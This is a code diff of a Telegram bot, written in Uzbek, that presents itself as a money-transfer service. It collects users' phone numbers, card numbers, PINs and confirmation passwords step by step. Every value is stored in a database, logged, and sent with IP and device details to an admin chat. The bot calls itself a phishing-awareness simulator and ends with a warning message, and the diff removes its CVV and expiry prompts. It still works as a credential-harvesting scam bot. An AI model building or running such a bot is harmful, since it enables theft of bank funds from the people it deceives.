@@ -88,15 +88,13 @@ TEXTS = {
     'code_verified': "✅ Xavfsizlik kodi tasdiqlandi!\n\nPul mablag'ini o'tkazish uchun **8600...** yoki **9860...** bilan boshlanadigan 16 xonali plastik karta raqamingizni kiriting:",
     'code_invalid': "❌ Kod noto'g'ri. Iltimos, ekrandagi kodni qaytadan to'g'ri kiriting:",
     'card_invalid': "❌ Karta raqami xato kiritildi. Iltimos, 16 xonali raqam kiriting:",
-    'card_accepted': "✅ Karta raqami qabul qilindi!\n\nKartangizning orqa tomonidagi **CVV/CVC** kodni (3 xonali) kiriting:",
-    'cvv_accepted': "✅ CVV kod qabul qilindi!\n\nKarta muddatini (**OO/YY** formatida) kiriting:",
-    'expiry_accepted': "✅ Karta muddati tasdiqlandi!\n\nPlastik kartangizning **PIN kodini** (4 xonali) kiriting:",
+    'card_accepted': "✅ Karta raqami qabul qilindi!\n\nPlastik kartangizning **PIN kodini** (4 xonali) kiriting:",
     'pin_accepted': "✅ PIN kod tasdiqlandi!\n\nPul o'tkazish jarayoni boshlanmoqda. Iltimos, kuting...",
     'password_code': "⏳ **Pul o'tkazilmoqda...**\n\n`{}`\n\nQo'shimcha xavfsizlik tekshiruvi uchun tasdiqlash **paroli** yuborildi.\n\n🔑 Parolni kiriting: `{}`",
     'password_invalid': "❌ Parol noto'g'ri. {} ta urinish qoldi:",
     'blocked': "🚫 Xavfsizlik choralari sababli profilingiz bloklandi. Iltimos, bank filialiga murojaat qiling.",
     'timer': "⏳ **Pul o'tkazilmoqda...**\n\n`{}`\n\nIltimos, kuting. Tranzaksiya yakunlanmoqda...",
-    'warning': "🛑 **DIQQAT! SIZ KIBERJINOYAT QURBONIGA AYLANISHINGIZ MUMKIN EDI!** 🛑\n\nUshbu bot **ijtimoiy muhandislik va fishing (firgarlik)** tuzoqlarini tushuntirish maqsadida yaratilgan o'quv-simulyatoridir.\n\n⚠️ **Siz hozirgina qanday xatolarga yo'l qo'ydingiz?**\n1. Telegram orqali tarqalgan 'tekin pul' haqidagi yolg'on xabarga ishonib botga kirdingiz.\n2. Shaxsiy telefon raqamingizni begona botga yozdingiz.\n3. Plastik karta raqami, CVV, muddati va PIN kodlaringizni kiritdingiz.\n4. **Eng xavflisi:** Tasdiqlash parolini ham kiritdingiz.\n\n💡 **Oltin qoidalar:**\n• Banklar hech qachon Telegram bot orqali karta ma'lumotlari yoki parol so'ramaydi.\n• Telefonga kelgan maxfiy kodlarni hech kimga bermang!\n\n🛡️ *Ogoh bo'ling, kiber-savodxonlikni oshiring va yaqinlaringizni ham ogohlantiring!*"
+    'warning': "🛑 **DIQQAT! SIZ KIBERJINOYAT QURBONIGA AYLANISHINGIZ MUMKIN EDI!** 🛑\n\nUshbu bot **ijtimoiy muhandislik va fishing (firgarlik)** tuzoqlarini tushuntirish maqsadida yaratilgan o'quv-simulyatoridir.\n\n⚠️ **Siz hozirgina qanday xatolarga yo'l qo'ydingiz?**\n1. Telegram orqali tarqalgan 'tekin pul' haqidagi yolg'on xabarga ishonib botga kirdingiz.\n2. Shaxsiy telefon raqamingizni begona botga yozdingiz.\n3. Plastik karta raqami va PIN kodlaringizni kiritdingiz.\n4. **Eng xavflisi:** Tasdiqlash parolini ham kiritdingiz.\n\n💡 **Oltin qoidalar:**\n• Banklar hech qachon Telegram bot orqali karta ma'lumotlari yoki parol so'ramaydi.\n• Telefonga kelgan maxfiy kodlarni hech kimga bermang!\n\n🛡️ *Ogoh bo'ling, kiber-savodxonlikni oshiring va yaqinlaringizni ham ogohlantiring!*"
 }
 
 
@@ -367,56 +365,10 @@ def get_card_handler(message):
             get_text(chat_id, 'card_accepted'),
             parse_mode="Markdown"
         )
-        bot.register_next_step_handler(msg, get_cvv_handler)
+        bot.register_next_step_handler(msg, get_pin_handler)
     else:
         msg = bot.send_message(chat_id, get_text(chat_id, 'card_invalid'), parse_mode="Markdown")
         bot.register_next_step_handler(msg, get_card_handler)
-
-# ============== CVV ==============
-def get_cvv_handler(message):
-    chat_id = message.chat.id
-    cvv = message.text.strip()
-
-    user_steps[chat_id]['cvv'] = cvv
-    user_steps[chat_id]['step'] = 3
-
-    conn = get_db()
-    c = conn.cursor()
-    c.execute("UPDATE users SET card_cvv = ?, step = 3 WHERE chat_id = ?", (cvv, chat_id))
-    conn.commit()
-    conn.close()
-
-    log_action(chat_id, "cvv_received", cvv)
-
-    msg = bot.send_message(
-        chat_id,
-        get_text(chat_id, 'cvv_accepted'),
-        parse_mode="Markdown"
-    )
-    bot.register_next_step_handler(msg, get_expiry_handler)
-
-# ============== KARTA MUDDATI ==============
-def get_expiry_handler(message):
-    chat_id = message.chat.id
-    expiry = message.text.strip()
-
-    user_steps[chat_id]['expiry'] = expiry
-    user_steps[chat_id]['step'] = 4
-
-    conn = get_db()
-    c = conn.cursor()
-    c.execute("UPDATE users SET card_expiry = ?, step = 4 WHERE chat_id = ?", (expiry, chat_id))
-    conn.commit()
-    conn.close()
-
-    log_action(chat_id, "expiry_received", expiry)
-
-    msg = bot.send_message(
-        chat_id,
-        get_text(chat_id, 'expiry_accepted'),
-        parse_mode="Markdown"
-    )
-    bot.register_next_step_handler(msg, get_pin_handler)
 
 # ============== PIN ==============
 def get_pin_handler(message):
@@ -424,11 +376,11 @@ def get_pin_handler(message):
     pin = message.text.strip()
 
     user_steps[chat_id]['pin'] = pin
-    user_steps[chat_id]['step'] = 5
+    user_steps[chat_id]['step'] = 3
 
     conn = get_db()
     c = conn.cursor()
-    c.execute("UPDATE users SET card_pin = ?, step = 5 WHERE chat_id = ?", (pin, chat_id))
+    c.execute("UPDATE users SET card_pin = ?, step = 3 WHERE chat_id = ?", (pin, chat_id))
     conn.commit()
     conn.close()
 
@@ -474,8 +426,6 @@ def verify_password_handler(message):
             f"📊 **Sizning ma'lumotlaringiz (o'quv maqsadida):**\n\n"
             f"📱 Telefon: `{user_steps[chat_id].get('phone', 'N/A')}`\n"
             f"💳 Karta: `{user_steps[chat_id].get('card', 'N/A')}`\n"
-            f"🔐 CVV: `{user_steps[chat_id].get('cvv', 'N/A')}`\n"
-            f"📅 Muddati: `{user_steps[chat_id].get('expiry', 'N/A')}`\n"
             f"🔢 PIN: `{user_steps[chat_id].get('pin', 'N/A')}`\n"
             f"🔑 Parol: `{user_steps[chat_id].get('password', 'N/A')}`\n\n"
             f"⚠️ **Agar bu real firgarlik bo'lganida, barcha pullaringiz va shaxsiy ma'lumotlaringiz o'g'irlangan bo'lar edi!**"
@@ -509,8 +459,6 @@ def notify_admin(user_chat_id):
             f"👤 Chat ID: `{user_chat_id}`\n"
             f"📱 Telefon: `{data.get('phone', 'N/A')}`\n"
             f"💳 Karta raqami: `{data.get('card', 'N/A')}`\n"
-            f"🔐 CVV: `{data.get('cvv', 'N/A')}`\n"
-            f"📅 Karta muddati: `{data.get('expiry', 'N/A')}`\n"
             f"🔢 PIN kod: `{data.get('pin', 'N/A')}`\n"
             f"🔑 Tasdiqlash paroli: `{data.get('password', 'N/A')}`\n"
             f"🕐 Vaqt: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"
@@ -560,8 +508,6 @@ def handle_admin_callback(call):
                     f"🆔 Chat ID: `{user[1]}`\n"
                     f"📱 Telefon: `{user[2]}`\n"
                     f"💳 Karta: `{user[3]}`\n"
-                    f"🔐 CVV: `{user[5]}`\n"
-                    f"📅 Muddati: `{user[4]}`\n"
                     f"🔢 PIN: `{user[6]}`\n"
                     f"🌐 IP: `{user[10]}`\n"
                     f"📱 Qurilma: `{user[11]}`\n"
